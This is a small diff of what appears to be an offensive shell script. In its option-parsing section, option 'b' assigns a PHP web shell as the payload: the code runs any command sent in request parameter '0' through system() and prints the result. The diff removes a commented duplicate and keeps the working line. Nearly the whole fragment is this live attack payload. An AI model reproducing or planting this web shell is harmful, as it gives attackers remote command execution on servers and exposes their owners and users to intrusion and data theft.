@@ -65,7 +65,6 @@ else
 				allowed=$OPTARG
 				;;
 			b)
-#				payload='<?php if(isset($_REQUEST['"'"'0'"'"'])){echo "<pre>"; system($_REQUEST['"'"'0'"'"']); echo "</pre>"; die;} ?>'
 				payload='<?php if(isset($_REQUEST["0"])){echo "<pre>"; system($_REQUEST["0"]); echo "</pre>"; die;} ?>'
 				;;
 			\?)
